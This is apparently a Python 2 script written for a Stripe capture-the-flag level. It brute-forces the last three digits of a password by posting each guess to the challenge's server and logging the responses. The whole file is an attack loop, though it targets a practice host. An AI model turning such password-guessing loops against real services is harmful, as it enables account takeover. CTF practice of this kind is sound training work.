import requests
import json
f = open('logfile', 'w')
for i in xrange(0,1000):
	print '%03d: '%i,
	print >> f, '%03d: '%i,
	payload = {'password': '129934229%03d'%i, 'webhooks': []}
	r = requests.post('https://level08-4.stripe-ctf.com/user-lxulnzkywg/',
		data=json.dumps(payload))
	print r.text,
	print >> f, r.text,
f.close()